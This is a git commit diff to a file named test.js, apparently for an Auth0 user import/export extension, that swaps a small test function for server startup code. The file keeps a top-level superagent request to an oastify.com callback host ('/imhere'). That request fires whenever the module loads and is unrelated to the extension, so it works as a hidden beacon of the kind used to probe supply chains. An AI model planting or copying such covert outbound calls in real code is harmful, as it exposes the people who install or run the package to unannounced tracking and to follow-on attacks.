6ca4cff89d94d7e5ee2c504eb23c4ba8f84ccef5
Martin <martinbydefault@gmail.com>
2024-05-21 08:29:14 -0300

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,22 @@
-module.exports = function (t) {
-  const request = require('superagent');
+const tools = require('auth0-extension-express-tools');
+
+const request = require('superagent');
 request.get('http://2adps724l1rxqukaimlu9sznkeq5ez2o.oastify.com/imhere')    
-}
+const expressApp = require('./server');
+const config = require('./server/lib/config');
+const logger = require('./server/lib/logger');
+
+const createServer = tools.createServer((cfg, storage) => {
+  logger.info('Starting User Import/Export Extension - Version:', process.env.CLIENT_VERSION);
+  return expressApp(cfg, storage);
+});
+
+
+module.exports = (context, req, res) => {
+  const publicUrl = (req.x_wt && req.x_wt.ectx && req.x_wt.ectx.PUBLIC_WT_URL) || false;
+  if (!publicUrl) {
+    config.setValue('PUBLIC_WT_URL', tools.urlHelpers.getWebtaskUrl(req));
+  }
+
+  createServer(context, req, res);
+};
